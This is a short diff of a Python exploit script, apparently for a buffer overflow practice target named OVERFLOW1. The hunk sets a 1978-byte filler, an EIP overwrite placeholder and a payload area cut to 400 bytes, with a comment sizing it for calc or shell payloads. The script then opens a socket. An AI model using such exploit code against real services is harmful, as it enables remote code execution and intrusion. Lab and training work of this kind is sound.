@@ -10,7 +10,7 @@ import sys
 header = "OVERFLOW1 "
 filler = "A" * 1978
 eip = "X" * 4
-extend = "E" * 512
+extend = "E" * 400   # Just enough to fit our payload -- Typical calc payload is ~220 Bytes :: Shell Payload is ~350 Bytes
 
 try:
     s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
